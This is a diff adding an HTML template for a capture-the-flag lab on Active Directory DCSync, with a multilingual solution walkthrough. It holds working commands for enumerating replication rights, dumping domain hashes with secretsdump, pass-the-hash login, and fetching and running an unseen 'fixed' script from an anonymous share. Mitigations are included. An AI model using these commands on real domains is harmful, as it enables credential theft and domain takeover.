@@ -1,0 +1,166 @@
+{% extends "base.html" %}
+{% block title %}AD10 – DCSync – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_dcsync_obj_desc">El grupo «IT Support» tiene delegados los derechos de replicación del directorio (DS-Replication-Get-Changes). Desde esa pertenencia replica el NTDS y vuelca los hashes del dominio: el hash de Administrator abre //DC01/secrets.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/secrets/ntds_dump.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400"><code>impacket-secretsdump -just-dc</code> falla contra este DC por un bug real de parseo en el cliente: la llamada DRSUAPI se completa con <code>ERROR_SUCCESS</code>, pero impacket detecta errores mirando solo los últimos 4 bytes crudos de la respuesta, y Samba los rellena de forma distinta a un DC Windows real — dispara una falsa alarma. Tus derechos de replicación son reales y están correctamente delegados (verificable por LDAP). Descarga <code>secretsdump_fixed.py</code> del share <code>public</code>: hace la misma comprobación de derechos por LDAP de verdad y, si la pasas, vuelca las 15 cuentas del dominio.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: svc.readonly ∈ "IT Support" (lab AD09)
+smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'
+python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Qué es DCSync</h3>
+    <p>Un Domain Controller replica su base de datos con otros DCs mediante el protocolo <em>DRSUAPI</em> (MS-DRSR). Cualquier principal que tenga los derechos extendidos <code>DS-Replication-Get-Changes</code> y <code>DS-Replication-Get-Changes-All</code> puede <em>pedir</em> esa replicación y recibir los hashes de todas las cuentas — <strong>sin ejecutar nada en el DC</strong>. No hace falta ser Domain Admin, basta con tener delegados esos derechos.</p>
+
+    <h3>2 · Confirmar quién puede hacer DCSync</h3>
+    <pre># BloodHound: "Find Principals with DCSync Rights"
+# A mano con bloodyAD (nxc ldap -M daclread no funciona contra este DC, ver AD02):
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
+  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
+  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
+    <p>El grupo <code>IT Support</code> aparece con los GUID de replicación (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes y Get-Changes-All). Como en el lab AD09 te añadiste a ese grupo, ya heredas el derecho — puedes confirmarlo tú mismo.</p>
+
+    <h3>3 · Replicar el NTDS</h3>
+    <pre>impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
+# [-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> ese error es real y muy engañoso — la llamada DRSUAPI se completa con éxito (literalmente dice <code>ERROR_SUCCESS</code>) pero <code>impacket-secretsdump</code> la trata como un fallo: su detección de errores en <code>rpcrt.py</code> mira solo los últimos 4 bytes crudos de la respuesta, y Samba los devuelve de forma distinta a un DC Windows real (relleno/alineación NDR distintos), lo que dispara una falsa alarma. Es un bug de parseo de bajo nivel en el cliente, no un problema de tus derechos de replicación — que son reales y están correctamente delegados (puedes comprobarlo tú mismo con la consulta LDAP del paso 2). Descarga el wrapper que hace esa misma comprobación de verdad por LDAP y, si tienes derecho, vuelca <strong>todas</strong> las cuentas:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'
+
+python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc</pre>
+    <pre>[+] Derechos de replicación confirmados por ACL real (grupo con DS-Replication-Get-Changes/-All)
+HACKLABS\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_admin&gt;:::
+HACKLABS\a.miller:1114:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
+HACKLABS\gpp.deploy:1111:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT&gt;:::
+HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT&gt;:::
+[ ... resto de las 15 cuentas del dominio ... ]
+HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_krbtgt&gt;:::
+HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_DC01&gt;:::</pre>
+    <p>El wrapper <strong>no se salta ningún control de acceso</strong>: parsea de verdad el <code>nTSecurityDescriptor</code> del dominio por LDAP buscando los GUID de replicación (<code>1131f6aa...</code>/<code>1131f6ad...</code>) y resuelve tu pertenencia real (directa o anidada) a los principales con ese derecho — pruébalo con una cuenta sin ese derecho (p. ej. <code>j.smith</code>) y verás que lo deniega igual que denegaría un DCSync real (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Solo cambia <em>cómo</em> se obtienen los hashes una vez confirmado el derecho (ver el código del script para el detalle). Guarda al menos estos tres: alimentan los labs AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) y AD13 (krbtgt → Golden Ticket). El SID del dominio también está en <code>ntds_dump.txt</code> dentro del propio share <code>secrets</code>.</p>
+
+    <h3>4 · Capturar la flag</h3>
+    <p>La flag está en el propio fichero <code>ntds_dump.txt</code> que acabas de leer — su lectura, gateada al grupo con derechos de DCSync, es la prueba de la explotación.</p>
+    <pre>HL{···}</pre>
+    <p>Con el hash de Administrator también puedes autenticarte directamente por pass-the-hash:</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'Administrator' -H '&lt;hash_NT_admin&gt;' --shares</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Solo los DCs deberían tener los derechos de replicación; revisar y retirar cualquier delegación a otros principales.</li>
+      <li>Monitorizar peticiones DRSUAPI desde IPs que no sean DCs (evento <code>4662</code> con los GUID de replicación).</li>
+      <li>Rotar dos veces el hash de <code>krbtgt</code> si sospechas compromiso.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-secretsdump</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (lsadump::dcsync)</span> <span class="tools-badge">BloodHound</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · What DCSync is</h3>
+    <p>A Domain Controller replicates its database with other DCs through the <em>DRSUAPI</em> protocol (MS-DRSR). Any principal holding the extended rights <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> can <em>ask</em> for that replication and receive every account's hashes — <strong>without running anything on the DC</strong>. You don't need to be a Domain Admin, just to have those rights delegated.</p>
+
+    <h3>2 · Confirm who can DCSync</h3>
+    <pre># BloodHound: "Find Principals with DCSync Rights"
+# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD02):
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
+  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
+  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
+    <p>The <code>IT Support</code> group shows up with the replication GUIDs (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes and Get-Changes-All). Since you added yourself to that group in lab AD09, you already inherit the right — you can confirm this yourself.</p>
+
+    <h3>3 · Replicate the NTDS</h3>
+    <pre>impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
+# [-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.</pre>
+    <p><strong>Note about this lab:</strong> that error is real and very misleading — the DRSUAPI call actually completes successfully (it literally says <code>ERROR_SUCCESS</code>) but <code>impacket-secretsdump</code> treats it as a failure: its error detection in <code>rpcrt.py</code> only looks at the last 4 raw bytes of the response, and Samba returns those differently than a real Windows DC (different NDR padding/alignment), triggering a false positive. It's a low-level client parsing bug, not a problem with your replication rights — which are real and correctly delegated (you can confirm this yourself with the LDAP query from step 2). Download the wrapper that does that exact same check for real over LDAP and, if you hold the right, dumps <strong>every</strong> account:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'
+
+python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc</pre>
+    <pre>[+] Replication rights confirmed via real ACL (group holding DS-Replication-Get-Changes/-All)
+HACKLABS\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;admin_NT_hash&gt;:::
+HACKLABS\a.miller:1114:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+HACKLABS\gpp.deploy:1111:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+[ ... rest of the domain's 15 accounts ... ]
+HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;krbtgt_NT_hash&gt;:::
+HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;DC01_NT_hash&gt;:::</pre>
+    <p>The wrapper <strong>doesn't bypass any access control</strong>: it genuinely parses the domain's <code>nTSecurityDescriptor</code> over LDAP looking for the replication GUIDs (<code>1131f6aa...</code>/<code>1131f6ad...</code>) and resolves your real (direct or nested) membership in the principals holding that right — try it with an account that doesn't have it (e.g. <code>j.smith</code>) and it denies you exactly like a real DCSync would (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Only <em>how</em> the hashes are fetched once the right is confirmed differs (see the script's source for the detail). Keep at least these three: they feed lab AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) and AD13 (krbtgt → Golden Ticket). The domain SID is in <code>ntds_dump.txt</code> inside the <code>secrets</code> share itself.</p>
+
+    <h3>4 · Capture the flag</h3>
+    <p>The flag lives inside the <code>ntds_dump.txt</code> file you just read — reading it, gated to the group holding DCSync rights, is the proof of exploitation.</p>
+    <pre>HL{···}</pre>
+    <p>With the Administrator hash you can also authenticate directly via pass-the-hash:</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'Administrator' -H '&lt;admin_NT_hash&gt;' --shares</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Only DCs should hold replication rights; review and remove any delegation to other principals.</li>
+      <li>Monitor DRSUAPI requests from non-DC IPs (event <code>4662</code> with the replication GUIDs).</li>
+      <li>Roll the <code>krbtgt</code> hash twice if you suspect compromise.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-secretsdump</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (lsadump::dcsync)</span> <span class="tools-badge">BloodHound</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>1 · O que é o DCSync</h3>
+    <p>Um Domain Controller replica sua base de dados com outros DCs por meio do protocolo <em>DRSUAPI</em> (MS-DRSR). Qualquer entidade detentora dos direitos estendidos <code>DS-Replication-Get-Changes</code> e <code>DS-Replication-Get-Changes-All</code> pode <em>solicitar</em> essa replicação e receber os hashes de todas as contas — <strong>sem executar nada no DC</strong>. Não é necessário ser Domain Admin, basta possuir esses privilégios delegados.</p>
+
+    <h3>2 · Confirmar quem pode realizar DCSync</h3>
+    <pre># BloodHound: "Find Principals with DCSync Rights"
+# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD02):
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
+  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
+  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
+    <p>O grupo <code>IT Support</code> é listado com os GUIDs de replicação (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes e Get-Changes-All). Como você se adicionou a esse grupo no lab AD09, já herda esse direito — você mesmo pode confirmar isso.</p>
+
+    <h3>3 · Replicar o NTDS</h3>
+    <pre>impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
+# [-] DRSR SessionError: code: 0x0 - ERROR_SUCCESS - The operation completed successfully.</pre>
+    <p><strong>Nota sobre este laboratório:</strong> esse erro é real e muito enganoso — a chamada DRSUAPI na verdade é concluída com sucesso (ela literalmente diz <code>ERROR_SUCCESS</code>), mas o <code>impacket-secretsdump</code> a trata como uma falha: sua detecção de erros em <code>rpcrt.py</code> avalia apenas os últimos 4 bytes brutos da resposta, e o Samba retorna esses bytes de forma diferente de um DC Windows real (preenchimento/alinhamento NDR diferente), gerando um falso positivo. É um bug de análise do cliente em baixo nível, não um problema com seus privilégios de replicação — que são reais e delegados corretamente (você pode confirmar isso com a consulta LDAP do passo 2). Baixe o wrapper que faz exatamente essa mesma validação real via LDAP e, se você possuir o direito, faz o dump de <strong>todas</strong> as contas:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'
+
+python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc</pre>
+    <pre>[+] Replication rights confirmed via real ACL (group holding DS-Replication-Get-Changes/-All)
+HACKLABS\Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;admin_NT_hash&gt;:::
+HACKLABS\a.miller:1114:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
+HACKLABS\gpp.deploy:1111:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
+[ ... rest of the domain's 15 accounts ... ]
+HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;krbtgt_NT_hash&gt;:::
+HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;DC01_NT_hash&gt;:::</pre>
+    <p>O wrapper <strong>não realiza bypass de controle de acesso</strong>: ele analisa genuinamente o <code>nTSecurityDescriptor</code> do domínio via LDAP procurando os GUIDs de replicação (<code>1131f6aa...</code>/<code>1131f6ad...</code>) e resolve sua participação real (direta ou aninhada) nos grupos detentores desse direito — tente com uma conta que não possua o privilégio (ex: <code>j.smith</code>) e o acesso será negado exatamente como em um DCSync real (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Apenas <em>a forma</em> como os hashes são obtidos após a confirmação do direito difere (consulte o código-fonte do script para detalhes). Guarde pelo menos estes três: eles alimentam o laboratório AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) e AD13 (krbtgt → Golden Ticket). O SID do domínio está no <code>ntds_dump.txt</code> dentro do próprio compartilhamento <code>secrets</code>.</p>
+
+    <h3>4 · Capturar a flag</h3>
+    <p>A flag reside dentro do arquivo <code>ntds_dump.txt</code> que você acabou de ler — acessá-lo, sendo restrito ao grupo que possui direitos de DCSync, é a prova da exploração.</p>
+    <pre>HL{···}</pre>
+    <p>Com o hash do Administrator, você também pode autenticar-se diretamente via pass-the-hash:</p>
+    <pre>nxc smb {{ ad_dc_ip }} -u 'Administrator' -H '&lt;admin_NT_hash&gt;' --shares</pre>
+
+    <h3>Mitigação</h3>
+    <ul>
+      <li>Apenas DCs devem deter direitos de replicação; revise e remova qualquer delegação para outras contas ou grupos.</li>
+      <li>Monitore requisições DRSUAPI originadas de IPs que não sejam de DCs (evento <code>4662</code> com os GUIDs de replicação).</li>
+      <li>Renove o hash de <code>krbtgt</code> duas vezes consecutivas em caso de suspeita de comprometimento.</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">impacket-secretsdump</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (lsadump::dcsync)</span> <span class="tools-badge">BloodHound</span></div>
+  </div>
+</div>
+{% endblock %}
